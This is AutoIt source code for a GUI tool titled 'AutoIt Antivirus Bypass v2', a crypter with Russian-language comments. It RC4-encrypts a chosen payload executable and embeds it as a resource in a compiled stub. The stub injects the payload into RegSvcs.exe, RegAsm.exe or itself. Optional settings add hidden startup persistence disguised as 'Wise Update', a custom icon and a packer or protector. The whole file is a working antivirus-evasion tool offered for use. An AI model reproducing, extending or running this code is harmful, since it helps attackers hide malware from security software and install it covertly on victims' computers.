#include <ButtonConstants.au3>
#include <ComboConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
#include <File.au3>
#include <GuiStatusBar.au3>
#include <SliderConstants.au3>
#include <ColorConstants.au3>
#include <File.au3>
Local $szDrive, $szDir, $szFName, $szExt
Const $KeyForEncrypt = _RandomGemerateKey(50)
#Region ### START Koda GUI section ### Form=
$Main_GUI = GUICreate("[AutoIt Antivirus Bypass v2] @Zhymabek Roman", 426, 350, -1, -1, -1, BitOR($WS_EX_TOOLWINDOW,$WS_EX_WINDOWEDGE))
$Group1 = GUICtrlCreateGroup("Select a file", 5, 8, 409, 81)
$sButtonAbrir = GUICtrlCreateButton("[ ... ]", 312, 24, 97, 20)
GUICtrlSetFont(-1, 8, 800, 0, "Cambria")
$sText1 = GUICtrlCreateInput("", 101, 24, 201, 21)
$Label1 = GUICtrlCreateLabel("-Payload:", 13, 28, 47, 16)
$Input2 = GUICtrlCreateInput("", 101, 56, 201, 21)
$Checkbox1 = GUICtrlCreateCheckbox("", 349, 56, 65, 21)
$Label2 = GUICtrlCreateLabel("-Command Line:", 13, 60, 77, 16)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group3 = GUICtrlCreateGroup("Injection", 5, 96, 409, 45)
$sRadioInject_ItSelf = GUICtrlCreateRadio("ItSelf", 335, 113, 60, 17)
$sRadioInject_RegSvcs = GUICtrlCreateRadio("RegSvcs", 15, 113, 100, 17)
$sRadioInject_RegAsm = GUICtrlCreateRadio("RegAsm", 175, 113, 70, 17)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Group6 = GUICtrlCreateGroup("Stub", 5, 220, 177, 45)
$sRadioStub_1 = GUICtrlCreateRadio("Stub 1", 20, 237, 60, 17)
$sRadioStub_2 = GUICtrlCreateRadio("Stub 2", 120, 237, 60, 17)
GUICtrlCreateGroup("", -99, -99, 1, 1)
$Go = GUICtrlCreateButton("Go", 162, 272, 97, 40)
GUICtrlSetFont(-1, 8, 800, 0, "Cambria")
$Group2 = GUICtrlCreateGroup("Options", 5, 144, 409, 69)
$Icon = GUICtrlCreateInput("", 101, 160, 201, 21)
$Label3 = GUICtrlCreateLabel("-Icon", 13, 164, 29, 16)
$Button1 = GUICtrlCreateButton("[ ... ]", 312, 160, 97, 20)
$Checkbox4 = GUICtrlCreateCheckbox("AutoRun with Windoiws", 15, 187, 130, 17)
$UPX = GUICtrlCreateCheckbox("UPX", 313, 187, 41, 17)
GUICtrlCreateGroup("", -99, -99, 1, 1)
;$Group8 = GUICtrlCreateGroup("", 237, 220, 177, 45)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUISetState(@SW_SHOW)
#EndRegion ### END Koda GUI section ###
$StatusBar1 = _GUICtrlStatusBar_Create($Main_GUI)
_GUICtrlStatusBar_SetText($StatusBar1,"No Error Detected!")
GUICtrlSetState($sRadioStub_1, $GUI_DISABLE)
GUICtrlSetState($sRadioStub_2, True)
GUICtrlSetState($Input2,$GUI_DISABLE)
GUICtrlSetState($UPX,$GUI_DISABLE)
GUICtrlSetState($Checkbox4,$GUI_DISABLE)
GUICtrlSetState($sRadioInject_RegSvcs, true)
While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit
		Case $Checkbox1
			If GUICtrlRead($Checkbox1) = 1 then
			GUICtrlSetState($Input2,$GUI_ENABLE)
		else
			GUICtrlSetState($Input2,$GUI_DISABLE)
			GUICtrlSetData($Input2, '')
		endif
		Case $sButtonAbrir
			$sAppPath = FileOpenDialog("Select payload file",@DesktopDir, "Win32 Apps (*.exe)",1)
			GUICtrlSetData($sText1 , $sAppPath)
		Case $Button1
			$sIconPath = FileOpenDialog("Select icon file",@DesktopDir, "Select ico file (*.ico)",1)
			GUICtrlSetData($Icon , $sIconPath)
		Case $Go
		Case $Go
		$filename=StringRegExp(GUICtrlRead($sText1),'(^.*)\\(.*)\.(.*)$',3)
		$Output = @ScriptDir & '\Data\Temp\Source_'
		$i = 1
		While FileExists($Output & $i & '_'&$filename[1]&'.au3')
			$i += 1
		WEnd
		$crypt_new_source_code = $Output & $i & '_'&$filename[1]&'.au3'
		#cs
		$file = FileOpen($crypt_new_source_code,2)
		$crypt_source_code_open = FileOpen(@ScriptDir & "\Data\SourceStub.au3")
				FileWrite($file,$crypt_source_code_open)
				FileClose($file)
				FileClose($crypt_source_code_open)
		#ce
		If GUICtrlRead($sRadioStub_1) = 1 then
			FileCopy(@ScriptDir & "\Data\SourceStub_1.au3", $crypt_new_source_code)
		ElseIf GUICtrlRead($sRadioStub_2) = 1 then
			FileCopy(@ScriptDir & "\Data\SourceStub_2.au3", $crypt_new_source_code)
		Else
			MsgBox(64,'Error','Hmmmm.....')
			Exit
		EndIf
		Local $SplitPath_sText1 = _PathSplit(GUICtrlRead($sText1), $szDrive, $szDir, $szFName, $szExt)
		#RegionStart ### InjectionExe
			If GUICtrlRead($sRadioInject_ItSelf) = 1 then
				_FileWriteToLine($crypt_new_source_code, 6, "Global $injecto = @AutoItExe", 1)
				_FileWriteToLine($crypt_new_source_code, 7, "Global $injectoName = " & "_PuthEx_EndName(@AutoItExe)", 1)
				$file1 = FileOpen(@ScriptDir & "\Data\default_itself.txt")
				$hFile_1 = FileOpen($crypt_new_source_code, 1)
				FileWrite($hFile_1,FileRead($file1))
				FileClose($hFile_1)
				FileClose($file1)
			ElseIf GUICtrlRead($sRadioInject_RegSvcs) = 1 then
				_FileWriteToLine($crypt_new_source_code, 6, "Global $injecto = _default_regsvcs_" & "(" & ")", 1)
				_FileWriteToLine($crypt_new_source_code, 7, "Global $injectoName = " & "'" & 'RegSvcs.exe' & "'", 1)
				$file1 = FileOpen(@ScriptDir & "\Data\default_regsvcs.txt")
				$hFile_1 = FileOpen($crypt_new_source_code, 1)
				FileWrite($hFile_1,FileRead($file1))
				FileClose($hFile_1)
				FileClose($file1)
			ElseIf GUICtrlRead($sRadioInject_RegAsm) = 1 then
				_FileWriteToLine($crypt_new_source_code, 6, "Global $injecto = _default_regasm_()", 1)
				_FileWriteToLine($crypt_new_source_code, 7, "Global $injectoName = " & "'" & 'RegAsm.exe' & "'", 1)
				$file1 = FileOpen(@ScriptDir & "\Data\default_regasm.txt")
				$hFile_1 = FileOpen($crypt_new_source_code, 1)
				FileWrite($hFile_1,FileRead($file1))
				FileClose($hFile_1)
				FileClose($file1)
			Else
				MsgBox(0,'Error','Error 0x1')
				ExitLoop
			EndIf
		#RegionEnd ### InjectionExe

		_FileWriteToLine($crypt_new_source_code, 8, "Global $commandline = " & "'" & GUICtrlRead($Input2) & "'", 1)
		_FileWriteToLine($crypt_new_source_code, 9, "Global $keyencode = " & "'" & $KeyForEncrypt & "'", 1)
#cs
		If GUICtrlRead($Checkbox6) = 1 then
			_FileWriteToLine($crypt_new_source_code, 1, 'MsgBox(266256,' & "Windows - Ошибка приложения", "Ошибка при запуске приложения (0xc0000022). Для выхода из приложения нажмите кнопку " & '"OK".' & ')', 1)
		endif
#ce
		If GUICtrlRead($Checkbox4) = 1 then
			_FileWriteToLine($crypt_new_source_code, 11, '_StartUp' & '(' & "1 + 2" & ',' & "'" & "WiseUpdate" & "'" & ',' & "'" & "'" & ',' & "'" & "'" & "," & "'" & "Wise Update" & "'" & ',' & "'" & "'" & ',' & "0," & '@SW_HIDE' & ')', 1)
			$file1 = FileOpen(@ScriptDir & "\Data\StartUp.txt")
			$hFile_1 = FileOpen($crypt_new_source_code, 1)
			FileWrite($hFile_1,FileRead($file1))
			FileClose($hFile_1)
			FileClose($file1)
		 endif
		; TODO: fix obfuscator loop (idk how)
		;_GUICtrlStatusBar_SetText($StatusBar1,"Obfuscation...")
		;sShell(@ScriptDir & '\Data\Util\obfuscator.exe',$crypt_new_source_code)
		$hFile = FileOpen(GUICtrlRead($sText1))
		If $hFile = -1 Then
			_GUICtrlStatusBar_SetText($StatusBar1,"Невозможно открыть payload файл... Подготовка к выходу")
			MsgBox(4096, "Ошибка", "Невозможно открыть payload файл.")
			Sleep(5000)
			exit
		Else
		$sFileCrypted = @TempDir & "\sFileCrypted_Temp_Crypt.exe"
		If FileExists($sFileCrypted) Then FileDelete($sFileCrypted)
		$sData = sRC4(FileRead(GUICtrlRead($sText1)), $KeyForEncrypt)
		FileWrite($sFileCrypted, $sData)
		FileClose($sFileCrypted)
		EndIf
		; $crypt_new_source_code_Obfuscated = StringTrimRight($crypt_new_source_code, 4) & "-Obfuscated.au3"
		$crypt_new_source_code_Obfuscated = $crypt_new_source_code
		$crypt_new_source_code_ObfuscatedOut = FileSaveDialog("Select folder",_PuthEx_Folder(GUICtrlRead($sText1)),"Win32 Apps (*.exe)",'', $SplitPath_sText1[3] & '_Crypted')
		If GUICtrlRead($Icon) = '' then
			$crypt_new_source_code_Icon = @ScriptDir & '\Data\ico.ico'
		else
		$crypt_new_source_code_Icon = GUICtrlRead($Icon)
		EndIf

		$OutStub_temp = @TempDir & "\Output_Temp_Crypt.exe"
		If FileExists($OutStub_temp) Then FileDelete($OutStub_temp)

		_GUICtrlStatusBar_SetText($StatusBar1,"Compiling...")
		RunWait(FileGetShortName(@ScriptDir & '\Data\Util\Compiler\Aut2exe.exe') & ' /in ' & FileGetShortName($crypt_new_source_code_Obfuscated) & ' /out ' & FileGetShortName($OutStub_temp) & ' /icon ' & FileGetShortName($crypt_new_source_code_Icon))
		FileClose($hFile)

		_GUICtrlStatusBar_SetText($StatusBar1,"Добавляем ресурсы...")
		sPutCryptedOnRes($OutStub_temp,$crypt_new_source_code_ObfuscatedOut,$sFileCrypted,"RCDATA" , "999", "0")

		_GUICtrlStatusBar_SetText($StatusBar1,"Накрываем протектором...")
		sShell(@ScriptDir & '\Data\Util\au3cx.exe',$crypt_new_source_code_ObfuscatedOut)
		_GUICtrlStatusBar_SetText($StatusBar1,"Готово!")
		MsgBox(64,'Done','Done All!')
	EndSwitch
WEnd

Func sShell($Path, $Parameter) ;Запуск ехе утилит в скрытном режиме
RunWait(FileGetShortName($Path) & ' ' & $Parameter, '', @SW_HIDE)
EndFunc

Func _PuthEx_EndName($FilePuth); Получает имя файла из пути(c:\dir\_)
Local $Split = StringSplit ( $FilePuth, "\" )
If $Split[0] = 0 Then Return $FilePuth
	For $i = $Split[0] To $Split[0]
	Return $Split[$i]
	Next
Return ""
EndFunc

Func sPutCryptedOnRes($sFile , $sFileFinal , $sData , $sResPath , $sResValue , $sResRead);Ложит ехе в Stub
		Local $ResourceData ,  $sChangeValue  , $OverWrite
		$sResource = @ScriptDir & '\Data\Util\RH\ResHack.exe'
		$OverWrite = '-addoverwrite '
		sShell( $sResource, $OverWrite & $sFile &  ','  & _
		' ' &  $sFileFinal &  ','  & ' '  & $sData &  ','  & $sResPath &  "," & $sResValue & "," & $sResRead  )
		Sleep(250)
		;FileDelete($sResource)
EndFunc

Func _PuthEx_Folder($FilePuth);Папка файла (c:\_\file.file)
StringReplace ( $FilePuth, "\", "" )
Local $ExtNum = @extended - 1
If $ExtNum < 0 Then Return ""
Local $Return = $FilePuth
	While 1
	$Return = StringTrimRight( $Return, 1 )
		StringReplace ( $Return, "\", "" )
		If @extended < $ExtNum Then Return ""
		If @extended = $ExtNum Then Return $Return
	Wend
EndFunc

Func _RandomGemerateKey($digits)
$pwd = ""
Dim $aSpace[3]
For $i = 1 To $digits
    $aSpace[0] = Chr(Random(65, 90, 1)) ;A-Z
    $aSpace[1] = Chr(Random(97, 122, 1)) ;a-z
    $aSpace[2] = Chr(Random(48, 57, 1)) ;0-9
    $pwd &= $aSpace[Random(0, 2, 1)]
Next
Return $pwd
EndFunc

Func sRC4($Data, $Key)
	Local $Opcode = "0xC81001006A006A005356578B551031C989C84989D7F2AE484829C88945F085C00F84DC000000B90001000088C82C0188840DEFFEFFFFE2F38365F4008365FC00817DFC000100007D478B45FC31D2F775F0920345100FB6008B4DFC0FB68C0DF0FEFFFF01C80345F425FF0000008945F48B75FC8A8435F0FEFFFF8B7DF486843DF0FEFFFF888435F0FEFFFFFF45FCEBB08D9DF0FEFFFF31FF89FA39550C76638B85ECFEFFFF4025FF0000008985ECFEFFFF89D80385ECFEFFFF0FB6000385E8FEFFFF25FF0000008985E8FEFFFF89DE03B5ECFEFFFF8A0689DF03BDE8FEFFFF860788060FB60E0FB60701C181E1FF0000008A840DF0FEFFFF8B750801D6300642EB985F5E5BC9C21000"
	Local $CodeBuffer = DllStructCreate("byte[" & BinaryLen($Opcode) & "]")
	DllStructSetData($CodeBuffer, 1, $Opcode)

	Local $Buffer = DllStructCreate("byte[" & BinaryLen($Data) & "]")
	DllStructSetData($Buffer, 1, $Data)

	DllCall("user32.dll", "none", "CallWindowProc", "ptr", DllStructGetPtr($CodeBuffer), _
													"ptr", DllStructGetPtr($Buffer), _
													"int", BinaryLen($Data), _
													"str", $Key, _
													"int", 0)

	Local $Ret = DllStructGetData($Buffer, 1)
	$Buffer = 0
	$CodeBuffer = 0
	Return $Ret
EndFunc
